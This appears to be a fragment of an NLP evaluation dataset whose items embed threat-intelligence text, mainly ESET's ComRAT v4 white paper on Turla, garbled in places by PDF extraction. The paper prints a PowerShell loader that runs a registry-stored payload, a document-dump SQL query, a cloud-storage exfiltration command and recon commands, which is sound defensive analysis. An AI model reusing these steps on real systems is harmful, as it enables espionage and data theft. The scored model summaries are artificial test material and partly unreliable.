Vendetta; a phishing email; the victim; the phishing email; a police station investigation letter; the COVID-19 virus; the email; the Trojan; the backdoor virus; control; the victim; a remote control Trojan; NanoCore; Remcos; the malware; the backdoor; the victim; the campaign; the attack; the analysis; information; the attack; the campaign; url; Australia; Australia; the UK; Europe; social engineering.", "ref_text": "<START-1>The document analyzes a new threat actor named Vendetta that has been active since April 2020. Vendetta appears to originate from Europe based on language clues in their malware code. Vendetta conducts cyber espionage campaigns that rely heavily on social engineering, forging phishing emails posing as government agencies and companies to get users to open malware. Email topics include police investigations, COVID-19 alerts, and corporate communications. Vendetta's malware uses code obfuscators like RoboSki to hide malicious payloads and execution logic in image files. The remote access Trojan ReZer0 contains hardcoded instructions to carry out functions like downloading additional files, keylogging, and stealing data. Analysis of Vendetta's targets indicates they aim to steal business intelligence and commercial information. Targets span multiple industries and countries, including an Australian fruit industry association. In summary, Vendetta is a new, likely Europe-based threat actor that has been conducting cyber espionage since April 2020 using social engineering and custom malware, with the goal of stealing sensitive business data from commercial entities. <END-1>", "t5/keyword/hint_hit_precision": 0.1875, "t5/word/hint_hit_recall": 0.04242424242424243, "gpt3/lexical/rouge_rouge1": 0.4879518072289157, "gpt3/lexical/rouge_rouge2": 0.09090909090909091, "gpt3/lexical/rouge_rougeL": 0.2289156626506024, "gpt3/lexical/rouge_rougeLsum": 0.2289156626506024, "gpt3_generated_text": ["In April of this year, 360 Total Security detected a new threat actor from Europe known as Vendetta. This hacker organization utilizes social engineering tactics, such as phishing emails, to target victims and gain access to sensitive information. Vendetta has been known to forge various emails, including police station investigation letters and COVID-19 virus test emails, in order to trick victims into downloading malicious programs. The malware used by Vendetta, named ReZer0, contains a backdoor virus that can control the victim's machine and steal valuable data. Additionally, ReZer0 also carries remote control Trojans like NanoCore and Remcos. The campaign targets a wide range of victims, including institutions like the Fruit Company of Australia. The analysis of Vendetta's attack campaign shows that they are still in the development stage and may incorporate network communication in the future. The article provides detailed information on the attack techniques used by Vendetta and the potential impact on victims in Australia, the UK, and Europe."]}, {"split_name": "val", "sample_id": "val_11", "prompt_text": "Extract the keywords: ESET Research White Paper // May 2020FROM AGENT.BTZ TO COMRAT V4A ten-year journeyMatthieu FaouTABLE OF CONTENTS LIST OF TABLES Table 1List of backdoor commands in ComRAT v419LIST OF FIGURES Figure 4Timeline of important attacks attributed to Turla 5 ComRAT v4 PDB path 7 Timeline of ComRAT 7 SQL command to dump documents from the central database (partially redacted) 8 Command to mount a OneDrive folder using net use (partially redacted) 8 Figure 5 Basic recon of the compromised machine 8 Figure 6 Turla operators\u2019 working hours 9 Figure 7 Injection of the orchestrator into the Explorer process 10 Figure 8 Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy 10 Figure 9 Summary of ComRAT architecture 11 Figure 10 Figure 11 Business hours check 12 Figure 12 Example of Abstract Factory method pattern 12 Figure 13 Example of Adapter pattern 12 Figure 14 Example of Mediator pattern 12 Figure 15 First bytes of the decrypted FAT16 Virtual File System 13 Figure 16 Virtual File System hierarchy 14 Figure 17 Content of /etc/transport/legacy/get.list 14 Figure 18 Generation of the pipe name 15 Figure 19 Overview of the email C&C mode 16 Figure 20 Contents of /etc/transport/mail/mailboxes/0/cookie.str(partially redacted) 16 Figure 21 Example of the Gmail simplified HTML view (for demonstration purpose only) 17 Figure 22 Contents of /etc/transport/mail/service/subject 17 Figure 23 Email from the Gmail inbox that contains commands in the attachment (partially redacted and opened in Microsoft Outlook for demonstration purposes only) 17 Figure 24 Decrypted attachment 18 Figure 25 Email sent by ComRAT to the operators\u2019 email address(partially redacted and opened in Microsoft Outlook for demonstration purposes only) 1941. EXECUTIVE SUMMARY Turla, also known as Snake, is one of oldest cyberespionage groups still active, with more than a decade of experience. Its operators mainly focus on high-profile targets such as governments and diplomatic entities in Europe, Central Asia and the Middle East. They are known for having breached major organizations such as the US Department of Defense in 2008 and the Swiss defense company RUAG in 2014. More recently, several European countries including France and the Czech Republic went public to denounce Turla\u2019s attacks against their governments.To perform these operations, Turla\u2019s operators maintain a large arsenal of malware including a rootkit, several complex backdoors aimed at different platforms, including Microsoft Exchange mail servers, and a large range of tools to enable pivoting on a network.In this white paper, we present our analysis of the latest version of one their oldest backdoors, publicly known as ComRAT. Key points in this white paper:\u2022 Turla has used ComRAT since at least 2007. \u2022 ComRAT v4 was first seen in 2017 and known still to be in use as recently as January 2020. \u2022 We identified at least three targets: two Ministries of Foreign Affairs and a national parliament. \u2022 ComRAT was used to exfiltrate sensitive documents. The operators used public cloud servicessuch as OneDrive and 4shared to exfiltrate data.\u2022 ComRAT is a complex backdoor developed in C++. \u2022 ComRAT uses a Virtual File System formatted in FAT16. \u2022 ComRAT is deployed using existing access methods, such as the PowerStallion PowerShell backdoor [1]. \u2022 ComRAT has two Command and Control channels\u2022 HTTP: It uses exactly the same protocol as ComRAT v3 \u2022 Email: It uses the Gmail web UI to receive commands and exfiltrate data\u2022 ComRAT can perform many actions on the compromised computers, such as executing additionalprograms or exfiltrating files.52. TURLA PROFILE Turla, also known as Snake, is an infamous espionage group active for at least a decade. The group is well known for its advanced custom tools and its ability to run highly targeted operations.2.1 Publicized high-profile attacks Over the past ten years, Turla has been responsible for numerous high-profile breaches. The targets include the United States Central Command in 2008 [2], the Finnish Ministry of Foreign Affairs in 2013 [3], the Swiss military company RUAG in 2014 [4] and the German Foreign Office in 2017 [5]. More recently, they allegedly compromised the French Armed Forces in 2018 [6] and the Austrian Foreign Ministry in 2019 [7]. The timeline in Figure 1 presents some of the major attacks attributed to Turla.(cid:31)(cid:30)(cid:30)8(cid:31)(cid:30)(cid:29)(cid:27)(cid:31)(cid:30)(cid:29)(cid:26)US Central CommandFinnish Foreign MinistryRUAG defense company(cid:31)(cid:30)(cid:29)(cid:25)German Foreign O(cid:4)ce(cid:31)(cid:30)(cid:29)(cid:24)(cid:31)(cid:30)(cid:29)8Austrian Foreign MinistryFrench Armed ForcesFigure 1 // Timeline of important attacks attributed to Turla2.2 Victimology As opposed to some other APT (Advanced Persistent Threat) groups, Turla is far from being opportunistic in the selection of its targets. The group is interested in collecting information from strategic organizations. In addition, to our knowledge, Turla has never conducted cybersabotage operations, such as those made by GreyEnergy [8] or TeleBots [9].With several years of experience tracking this espionage group, we have identified the most at-risk types of organizations:\u2022 Ministries of Foreign Affairs and diplomatic representations (embassies, consulates, etc.) \u2022 Military organizations \u2022 Regional political organizations \u2022 Defense contractorsOther APT groups might also be targets of interest for Turla. In June 2019, Symantec reported [10] that Turla had hijacked OilRig infrastructure and used it to drop its own malware onto existing OilRig victims\u2019 networks.According to our telemetry and public information, Turla seems to target organizations in most parts of the world. Moreover, over the past few years, we have noticed that geographical areas of conflict, such as Eastern Europe and the Middle East, are under heavy attack from this APT group. However, even with this recent focus, it has not abandoned its traditional targets in Western Europe and Central Asia.62.3 Tools and tactics The usual modus operandi of Turla\u2019s operators is to use basic first-stage malware for initial reconnaissance. In some cases they even use generic tools such as Metasploit [11] [12]. If they deem a victim interesting enough, they switch to more advanced malware such as Carbon [13] or Gazer [14].The initial compromise is generally tailored towards specific types of victims. They mainly rely on spearphishing emails [15], watering hole attacks [16] [17] or Man-in-the-Middle attacks [18].After this initial compromise step, they move laterally on the network and collect credentials. To avoid suspicious communications to the internet, they developed tools such as DarkNeuron [19] and RPC Backdoor [1], to forward commands and exfiltrate data from the local network. They also regularly create user accounts that they use later if they lose access to a compromised machine. This all means that once compromised, it is very hard to eject the attacker from the network without rebuilding most of it.Finally, collected data are exfiltrated through various channels such as HTTP, email or cloud storage. Turla\u2019s operators usually rely on compromised web servers for the first C&C level. They are also known for using Cloudflare and SATCOM IP addresses to hide the real destination of this traffic [20].Turla\u2019s operators have at their disposal a wide arsenal of malware tools for all major desktop platforms: Windows, macOS and Linux. Some of these tools stand out for their complexity, such as the Snake rootkit, which relies on a vulnerable VirtualBox driver to bypass Windows Driver Signature Enforcement [21]. Some others stand out for their originality, such as the Outlook backdoor we analyzed in 2018 [22] or LightNeuron, a backdoor targeting Microsoft Exchange [23].During our several years of tracking Turla\u2019s activities, we have also noticed that its operators react quickly to both detection and publication. Apparently, they do not hesitate to remove their tools and clean some artefacts such as malware logs, and potentially lose control of a machine, if they feel they will be detected soon. They probably do not want their more-advanced malware to be exposed publicly.3. OVERVIEW3.1 From Agent.BTZ to ComRAT v4 Agent.BTZ is a Remote Access Trojan (RAT) that became infamous after its use in a breach of the US military in 2008 [24]. The first version of this malware, seen in 2007, exhibited worm capabilities by spreading through removable drives. Later, this malware family, along with other families such as the Snake rootkit, was attributed to an APT group dubbed Turla.From 2007 to 2012, two new major versions of the RAT, later named ComRAT, were released as described by G DATA [25]. Interestingly, both employed the well-known Turla XOR key:1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6 gs923HL34x2f5cvd0fk6c1a0sThen, and until mid-2017, Turla developers made a few changes to ComRAT but it was still using a very similar code base.In 2017, we noticed that a very different version of ComRAT was released. As shown in Figure 2, it is version 4 of a malware family its authors dubbed Chinch. It was also the internal name the developers used for the previous versions.7Figure 2 // ComRAT v4 PDB pathThis new version uses a completely new code base and is far more complex than its predecessors. It takes some inspiration from Snake, the rootkit used by Turla with, for instance, a Virtual File System formatted in FAT16. Figure 3 provides an overview of ComRAT history.(cid:31)(cid:30)(cid:30)(cid:28)(cid:31)(cid:30)(cid:30)(cid:26)(cid:31)(cid:30)(cid:30)(cid:26)ComRAT v(cid:12) releaseBreach at the US military using ComRATComRAT v(cid:1) release(cid:31)(cid:30)(cid:27)(cid:30)(cid:31)(cid:30)(cid:29)(cid:28)(cid:31)(cid:30)(cid:29)(cid:28)ComRAT v(cid:8) use still continuingComRAT v(cid:8) releaseLast known ComRAT v(cid:16) activityFigure 3 // Timeline of ComRAT(cid:31)(cid:30)(cid:29)(cid:27)ComRAT v(cid:16) release3.2 Targeting During our investigation, we were able to identify three different targets where ComRAT v4 has been used:\u2022 Two Ministries of Foreign Affairs in Eastern Europe \u2022 One national parliament in the Caucasus regionThis targeting is in-line with other campaigns we described in the past.3.3 Attribution to Turla Based on the victimology and the TTPs, we believe that ComRAT is used exclusively by a single APT group.Moreover, there are a few elements linking ComRAT v4 to Turla:It uses the same internal name, Chinch, as the previous versions It uses the same custom C&C protocol over HTTP as ComRAT v3 \u2022 A part of the network infrastructure is shared with Mosquito [18] It was dropped by, or has dropped other, Turla malware families: \u2022 \u2022 A PowerShell loader [1] \u2022 The PowerStallion backdoor [1] \u2022 The RPC Backdoor [1]Therefore, we believe that the ComRAT v4 malware family is part of the Turla arsenal.Insight into attacker\u2019s activity3.4 During our investigation, we were able to get insights about what Turla operators were doing on the compromised machines.The main use of ComRAT is discovering, stealing and exfiltrating confidential documents. In one case, its operators even deployed a .NET executable to interact with the victim\u2019s central MS SQL Server database containing the organization\u2019s documents. Figure 4 is the redacted SQL command.8sqlCommand.CommandText = \u201cselect top \u201c + num2.ToString() + \u201c filename, img, datalength(img), id from <Redacted> with(nolock) where not img is null and id>\u201d + num4. ToString(); sqlCommand.CommandText += \u201c and datalength(img)<1500000 and (filename like \u2018%.doc\u2019 or filename like \u2018%.docx\u2019 or filename like \u2018[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]%.pdf\u2019 or (filename like \u20183%.pdf\u2019 and len(filename)>9))\u201d; sqlCommand.CommandText += \u201c order by id\u201d;Figure 4 // SQL command to dump documents from the central database (partially redacted)These documents were then compressed and exfiltrated to a cloud storage provider such as OneDrive or 4shared. Cloud storage is mounted using the net use command as shown in Figure 5.tracert -h 10 yahoo.com net use url <redacted password> /u:<redacted>@aol.co.uk tracert -h 10 yahoo.comFigure 5 // Command to mount a OneDrive folder using net use (partially redacted)In addition to document stealing, the operators also run many commands to gather information about the Active Directory groups or users, the network or Microsoft Windows configurations such as the group policies. Figure 6 is a list of commands executed by Turla operators.gpresult /z net view /domain net user administrator net user /domain net group net group /domain net localgroup Administrators net group \u201cDomain Computers\u201d /domain net group \u201cDomain Admins\u201d /domain net group \u201cDomain Controllers\u201d /domain dir \u201c%programfiles%\u201d net group \u201cExchange Servers\u201d /domain net accounts net accounts /domain ipconfig /displaydnsFigure 6 // Basic recon of the compromised machine9Finally, we also noticed that Turla operators are aware of and try to evade security software. For instance, they regularly exfiltrate security-related log files in order to understand whether their malware samples have been detected. This shows the level of sophistication of this group and its intention to stay on the same machines for a long time.We also extracted the times at which Gmail received the emails sent by the operators, which should be very close to the time at which commands were sent by the operators through the email C&C channel. We believe this is a good metric because the emails are later processed by the backdoor. Thus, it shows the time at which the operators were working and not the time at which the infected computer executed malicious commands.Figure 7 represents the time of day that commands were sent, in a one-month period. Given the distribution, it is likely that the operators are working in the UTC+3 or UTC+4 time zone.(cid:29)(cid:31)(cid:25)(cid:31)(cid:30)(cid:31)(cid:31)Number of emails receivedUTC timezoneUTC+(cid:27) timezone(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:31)(cid:26)(cid:30)(cid:26)(cid:29)(cid:26)(cid:28)(cid:26)(cid:27)(cid:30)(cid:31)(cid:30)(cid:30)HourFigure 7 // Turla operators\u2019 working hours4. COMRAT V4 According to its compilation timestamp, which is likely genuine, the first known sample of ComRAT v4 was compiled in April 2017. The most recent iteration of the backdoor was, to the best of our knowledge, compiled in November 2019. In this section, we will describe a sample compiled in March 2019, but it is very similar to the latest version.Installation and persistence4.1 Based on ESET telemetry, we believe that ComRAT is installed using an existing foothold such as compromised credentials or via another Turla backdoor. For instance, we\u2019ve seen ComRAT installed by PowerStallion, a PowerShell-based backdoor we described in 2019 [1].The ComRAT installer is a PowerShell script that creates a Windows scheduled task and fills a registry value with the encrypted payload. The registry value is usually HKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons10The Windows task is usually in C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\ Customer Experience Improvement Program\\Consolidator and contains the following command:<Exec><Command>cmd.exe</Command> <Arguments>/c \u201c%SystemRoot%\\System32\\wsqmcons.exe &amp; powershell.<Actions Context=\u201dWinSQMAccount\u201d> exe -v 2 \u201c$QAY076ai = \u2018AKWC;HUA389933tomasoas\u2019;[Text.Encoding]::ASCII. GetString([Convert]::\\\u201dFr`omBa`se6`4Str`ing\\\u201d((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\ Windows).WSqmCons))|iex;\u201d\u201d</Arguments> </Actions>Note that the password used to decrypt the ComRAT payload is different on each machine.It is interesting to note that while ComRAT\u2019s name is derived from its use of COM object hijacking, in this new version the developers no longer use this method for ensuring persistence.4.2 Orchestrator The PowerShell loader is executed every time the user logs in. It is very similar to the cluster of loaders we described in 2019 [1] and is based on the Invoke-DllInjection loader from the PowerSploit framework. It loads the ComRAT orchestrator DLL into explorer.exe as shown in Figure 8.Figure 8 // Injection of the orchestrator into the Explorer processThis is a C++ DLL existing in 32- and 64-bit versions. It has two exports named UMEP and VFEP. The 64-bit version is called x64_Release.dll as shown in Figure 9.Figure 9 // Screenshot of ComRAT v4 64-bit orchestrator DLL in Detect It Easy11The orchestrator embeds an encrypted (XORed with a hardcoded key) communication module (a 32- or 64-bit DLL) that will be injected into the default web browser. The orchestrator interacts with the ComRAT communication module (described in more detail later) through a named pipe. Thus, all of the malware\u2019s network communications will be initiated in the browser process, which is stealthier than if it was done directly by the orchestrator.The orchestrator has some interesting features such as a Virtual File System (VFS) in FAT16 format, which we describe later, and it can use Gmail to receive commands and to exfiltrate information to the operators. Figure 10 is an overview of ComRAT\u2019s architecture.Existing accessto the victim's computerEx: PowerStallionExecute</>PowerShellscriptWriteCreateEncrypted payload in Windows RegistryWindows task for persistencecommunicationInjectlibraryDefault browserC&C ServerGMAILGmail addressLoad payload in explorer.exeexeOrchestrator runningin explorer.exeHTTP request/responsein a named pipeVirtual FAT\u2039\u0152 File System>_CommandsEx\ufb01ltrate documents to various cloud servicesNetwork and Active Directory reconDrop and execute additional malware programsMonitor security logsTurla operatorFigure 10 // Summary of ComRAT architecture12The orchestrator is programmed to sleep outside local business hours (9 to 5, Monday to Friday), as shown in Figure 11.Figure 11 // Business hours check4.3 Development Our in-depth analysis of this malware family leads us to believe that the ComRAT developers are both experienced and spent time designing the malware architecture.We noticed that they used several design patterns. For example, they use the so-called Abstract Factory pattern [26] in the code responsible for parsing and creating instructions based on C&C communications, as shown in Figure 12. It is interesting to note that it was implemented using a C++ template. Thus, there is a lot of duplicated code in the compiled binary because each templated class or function will have a different implementation for each type it is used with.Figure 12 // Example of Abstract Factory method patternThey also have used other design patterns, such as the Adapter pattern [27], shown in Figure 13, and the Mediator pattern [28], shown in Figure 14.Figure 13 // Example of Adapter patternFigure 14 // Example of Mediator patternIt should be noted that, in addition to complex elements such as a FAT16 VFS, ComRAT\u2019s developers use some obfuscation. Most of the strings in their binaries are string-stacked and encrypted, with a different key per sample, with the apparent goal of preventing easy detection of this malware family.Finally, they use several third-party libraries:\u2022 fat_io_lib: for the Virtual File System \u2022 Gumbo: to parse HTML \u2022 wolfCrypt: for C&C data (en|de)cryptionOverall, it tells us that the Turla group tasked experienced developers for this new version of ComRAT. Both the development effort and the technologies used, such as the Virtual File System, make it a counterpart of Carbon [13] and Gazer [14].134.4 Virtual File System and configuration All the files related to ComRAT, except the orchestrator DLL and scheduled task, are stored in a Virtual File System. This is a regular file stored at one of these locations:\u2022 %TEMP%\\FXSAPIDebugTrace.txt \u2022 %TEMP%\\iecache.bin However, once decrypted, these files are FAT16 partition images, as shown in Figure 15.Figure 15 // First bytes of the decrypted FAT16 Virtual File SystemThe encryption key is unique per machine, as it is generated during the installation. It uses a variant of Mersenne Twister and takes its seed from std::_Random_device. This 32-byte key is then stored in (HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\ {59031A47-3F72-44A7-80C5-5595FE6B30EE}\\Order The VFS is encrypted using AES-256 in XTS mode. This mode of operation is a standard for disk encryption. The first 16-bytes of the key are used for the block encryption while the last 16-bytes are used to derive the initialization vector from the sector number.The default VFS container file is hardcoded in the orchestrator and dropped the first time it is executed. Then, most of the files can be updated using backdoor commands.It uses UNIX-like paths so, for example, the log file is located at /var/log/working.c4log. The malware uses a third-party library, fat_io_lib, to read the partition. Figure 16 is an overview of the files and folders in the VFS.14FAT(cid:28)(cid:27) Virtual File Systemvarlogworking.c(cid:143)logbin<Executables>Contains log \ufb01lesContains the con\ufb01guration related to C&C communicationsProbably contains modules (cid:14)PE executables(cid:11) but we haven\u2019t seen any in the wild.Contains the encryption keys (cid:14)AES and RSA(cid:11) used for the C&C communicationsContains backdoor commands that will be executed automatically. For example, /etc/auto_exec/send_log.c4 executes the backdoor command 106: SendWorkingLog.Contains commands executed at startup.etctransportmailmailboxes(cid:4)command_addr.str answer_addr.str cookie.strserviceindex.int subject.strlegacyget.list post_fault_count.intservicecurrent_transport.str timeout.intpkiaes_key.pki public_cert.pki id.pkiauto_execsend_log.c(cid:143)init_ddir_set_ipcon\ufb01g.c(cid:143)Figure 16 // Virtual File System hierarchyIt is interesting to note that some files use extensions such as c4 or c4log, where c4 most likely stands for Chinch 4, the internal name of the malware family.By mounting the Virtual File System, we get access to all these files. Figure 17 is an example of /etc/transport/legacy/get.list content. This is a list of C&C domains separated with a pipe.Figure 17 // Content of /etc/transport/legacy/get.list154.5 Command & Control channels ComRAT v4 has two different C&C channels: HTTP (internally known as legacy) and email (internally known as mail), which uses the Gmail web interface. The mode to be used (legacy, mail or any) is specified in the file /etc/transport/service/current_transport.strCommunication module The orchestrator retrieves the default browser, by checking HKCR\\http\\shell\\open\\command, and injects the communication DLL, either 32- or 64-bit, into it. These DLLs are hardcoded in the orchestrator and XORed with a static key.This module is quite simple as it is just a \u201cbridge\u201d between the orchestrator and the C&C server. The goal is probably to make the malware\u2019s HTTP requests to its C&C appear to be from a process that would be expected to connect to the internet and make HTTP requests.The orchestrator uses a named pipe to interact with the communication module. The pipe name is derived from the computer name as shown on Figure 18.Figure 18 // Generation of the pipe nameThe orchestrator sends C&C requests to the communication module, which sends them to the C&C server, and that module sends any responses or new commands from the C&C server to the orchestrator, using the same pipe.The communication DLL is slightly obfuscated, in a very similar way to many other Turla malware families. All the strings are string-stacked, some of them XORed, and most of the Windows APIs it uses are resolved dynamically.Legacy/HTTP[S] The most basic C&C mode is what the ComRAT developers called legacy mode. Indeed, it is the exact same protocol as implemented in ComRAT v3.x.We believe that it is intended to be compatible with C&C servers already in place, avoiding the need to deploy a whole new set of servers. It also gives the operators the flexibility to control old ComRAT instances without the need to upgrade all the victims to version 4. Even if this is an old C&C protocol, it was still being used in the wild in 2020.Two lists of C&C servers are stored in the VFS at the paths: /etc/transport/legacy/get.list and /etc/transport/legacy/post.list They generally each contain two or three different domains, separated with a pipe character.The format of the URL is quite easy to recognize as it hasn\u2019t changed for years: http[s]://<C&C domain>/index/index.php?h=<base64 XOR key>&d=<base64 XORed data> The h parameter contains an 8-byte XOR key encoded in base64. It is generated using the rand function seeded by the result of a call to the GetTickCount function. The d parameter contains the base64-encoded data. It is encrypted using the XOR key in the h parameter.16Email The second C&C mode is called mail by ComRAT developers. The code is actually very specific to Gmail and we haven\u2019t seen any other version of ComRAT able to use another email provider.A basic overview of the email C&C mode is shown Figure 19.ComRATRead the email address and the authentication cookies in the VirtualFile SystemConnect to the Gmail web UIParse the HTMLof the inboxDownload the emailattachmentsDecrypt each attachmentExecutethe commandsSend the result back by email(cid:25)(cid:24)(cid:23)(cid:22)(cid:21)(cid:20)(cid:19)Sendcommandsby emailControlthe mailboxOperator mailbox(cid:31)often on GMX(cid:21)Turla operatorcommand resultsReceiveby emailFigure 19 // Overview of the email C&C modeStep 1The orchestrator reads the email address in /etc/transport/mail/mailboxes/0/command_addr It also reads the cookies to authenticate on Gmail in /etc/transport/mail/mailboxes/0/cookie These cookies typically have a limited lifetime so they should be updated from time to time. Figure 20 is a redacted screenshot of the contents of the cookie file.Figure 20 // Contents of /etc/transport/mail/mailboxes/0/cookie.str (partially redacted)17Step 2It connects to the basic HTML view of Gmail at the URL url google com/mail/?ui=html&zy=g using the cookies described above. An example of such a view is shown Figure 21.Figure 21 // Example of the Gmail simplified HTML view(for demonstration purpose only)Step 3It parses the inbox HTML page using the Gumbo HTML parser in order to extract the list of emails. It will only read emails for which the Subject: is in the list at /etc/transport/mail/service/subject, as shown in Figure 22.Figure 22 // Contents of /etc/transport/mail/service/subjectThen, for each email, it extracts the link to download the attachment. The attachments are generally masquerading as documents with names such as document.docx and documents.xlsx. The body of the email is generally empty. Figure 23 is an example of an email sent by Turla operators to a ComRAT C&C mailbox.Figure 23 // Email from the Gmail inbox that contains commands in the attachment (partially redacted and opened in Microsoft Outlook for demonstration purposes only)18Step 4It downloads all the relevant attachments from Gmail. The email is then deleted so that it is not processed a second time. Step 5Despite their extensions, the attachments are not docx or xslx files. They contain a blob of data in the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:28)+n<victim id>CRC(cid:20)(cid:19) of the encrypted data(cid:9)x(cid:9)(cid:7)AES(cid:3)encrypteddataThe AES-256 key is stored in the VFS in /etc/pki/aes_key and it uses AES in CBC mode with a null initialization vector. Step 6Once decrypted, we have access to the backdoor commands and parameters. We provide more details about the backdoor commands in section 4.6. Figure 24 is an example of a decrypted email attachment. 0x67 is the ID for \u201cExecute a command with cmd.exe\u201d and it is followed by the command to execute. We believe that the beginning of the decrypted data is filled with random bytes.Figure 24 // Decrypted attachmentStep 7The backdoor creates an attachment containing the result of the commands. The attachment name consists of 20 random digits and of the .jpg.bfe so-called double extension. Its content has the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:25)(cid:27)(cid:26)(cid:25)+n<victim id>CRC(cid:20)(cid:19) of the encrypted data(cid:9)x(cid:9)(cid:7)RSA(cid:4)encryptedAES key (cid:1)+padding(cid:141)AES(cid:4)encrypteddataThe AES key is different for each email as it is randomly generated. Then, it is encrypted using RSA-2048 with the public key stored in /etc/pki/public_cert.pki. The format of the key is quite unusual as it is raw bytes representing the concatenation of n and e. Turla\u2019s developers did not implement the RSA encryption themselves; they used code from the wolfSSL library and more specifically from a commit before March 2016.19Finally, and using the Gmail web interface as before, the backdoor sends the email to the address contained in /etc/transport/mail/mailboxes/0/answer_addr. This address is typically not hosted on Gmail but rather on GMX or VFEmail. It is also the email address from which the operators send commands to the Gmail address. Figure 25 is an example of an email created by ComRAT.Figure 25 // Email sent by ComRAT to the operators\u2019 email address (partially redacted and openedin Microsoft Outlook for demonstration purposes only)4.6 Backdoor commands The operators can send commands using either of the C&C channels. The backdoor will receive the command ID and the arguments, if any.As seen in Table 1, the commands implemented in ComRAT v4 are not surprising and allow control of almost everything on the machine: manage files, execute additional processes or gather logs.Table 1List of backdoor commands in ComRAT v4ID Write in a file Read a file Execute a command with cmd.exe Set the timeout for the C&C channel Add an address in /etc/transport/legacy/get.list or in /etc/transport/legacy/post.list Send /var/log/working.c4log Load a PE from memory using an internal PE loader Load a PE from file using an internal PE loader Delete an address from /etc/transport/legacy/get.list or /etc/transport/legacy/post.list Get the configuration List a directory in the Virtual File System Execute a PE with CreateProcessW Invoke a PowerShell script from memory using a PowerShell runner Invoke a PowerShell script from a file using a PowerShell runner Delete the messages in the Gmail mailbox (added in the most recent version, first seen around November 2019)205. CONCLUSION Version four of ComRAT is a totally revamped malware family released in 2017. Its developers took inspiration from other Turla backdoors, such as Snake, to build a very complex piece of malware.Its most interesting features are the Virtual File System in FAT16 format and the ability to use the Gmail web UI to receive commands and exfiltrate data. Thus, it is able to bypass some security controls because it doesn\u2019t rely on any malicious domain. We also noticed that this new version abandoned the use of COM object hijacking for persistence, the method that gave the malware its common name.We found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla group is still very active and a major threat for diplomats and militaries.We will continue to monitor Turla developments to help defenders protect their networks.Indicators of Compromise can also be found on GitHub. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset com.216. BIBLIOGRAPHY 1 Yle. (2016, 01 13). Russian group behind 2013 Foreign Ministry hack. Retrieved fromurl fi/uutiset/osasto/news/russian_group_behind_2013_foreign_ministry_hack/85915482 Boutin, J.-I. (2017, 06 06). Turla\u2019s watering hole campaign: An updated Firefoxextension abusing Instagram. Retrieved from url welivesecurity com/2017/06/06/ turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/3 Cherepanov, A. (2017, 06 30). TeleBots are back: Supply-chain attacks against Ukraine. (ESET) Retrieved fromurl welivesecurity com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/4 Cherepanov, A. (2018, 10). GREYENERGY: A successor to BlackEnergy. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2018/10/ESET_GreyEnergy pdf5 Corfield, G. (2020, 02 14). Austrian foreign ministry: \u2018State actor\u2019 hack on government IT systems is over.Retrieved from url theregister co uk/2020/02/14/austria_foreign_ministry_hack_turla_group_allegs/6 ESET. (2018, 08). Turla Outlook Backdoor. Retrieved fromurl welivesecurity com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor pdf7 ESET Research. (2017, 03 30). Carbon Paper: Peering into Turla\u2019s second stage backdoor. (ESET) Retrieved fromurl welivesecurity com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/8 ESET Research. (2017, 08). Gazing at Gazer - Turla\u2019s new second stage backdoor. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2017/08/eset-gazer pdf9 ESET Research. (2018, 01). Diplomats in Eastern Europe bitten by a Turla mosquito. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2018/01/ESET_Turla_Mosquito pdf10 ESET Research. (2018, 05 22). Turla Mosquito: A shift towards more generic tools. Retrieved fromurl welivesecurity com/2018/05/22/turla-mosquito-shift-towards-generic-tools/11 Faou, M. (2019, 05). Turla LightNeuron. Retrieved fromurl welivesecurity com/wp-content/uploads/2019/05/ESET-LightNeuron pdf12 Faou, M. (2020, 03 12). Tracking Turla: New backdoor delivered via Armenian watering holes. Retrieved fromurl welivesecurity com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/13 Faou, M., & Dumont, R. (2019, 05 29). A dive into Turla PowerShell usage. Retrieved fromurl welivesecurity com/2019/05/29/turla-powershell-usage/14 G DATA. (2014, 03 07). Uroburos \u2013 Deeper travel into kernel protection mitigation. Retrieved fromurl gdatasoftware com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation15 G DATA. (2015, 01 15). Evolution of sophisticated spyware: from Agent.BTZ to ComRAT. Retrieved fromurl gdatasoftware com/blog/2015/01/23927-evolution-of-sophisticated-spyware-from-agent-btz-to-comrat16 Huss, D. (2017, 08 17). Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G20-themed attack. Retrieved from url proofpoint com/us/threat-insight/post/ turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack17 Kaspersky GReAT. (2018, 10 04). Shedding Skin - Turla\u2019s Fresh Faces. Retrieved fromurl com/shedding-skin-turlas-fresh-faces/88069/18 KNOWLTON, B. (2010, 08 25). Military Computer Attack Confirmed. (New York Times) Retrieved 04 09, 2018,from url nytimes com/2010/08/26/technology/26cyber html19 Managed Adversary and Threat Intelligence (MATI). (2019, 06 20). Waterbug:Espionage Group Rolls Out Brand-New Toolset in Attacks Against Governments. Retrieved from url broadcom com/blogs/threat-intelligence/waterbug-espionage-governments20 MELANI. (2016, 05 23). Technical Report about the Malware used in the Cyberespionage against RUAG.Retrieved from url melani admin ch/melani/en/home/dokumentation/reports/technical-reports/ technical-report_apt_case_ruag html2221 National Cyber Security Centre. (2017, 11 23). Turla group using Neuron and Nautilus tools alongsideSnake malware. Retrieved from url ncsc gov 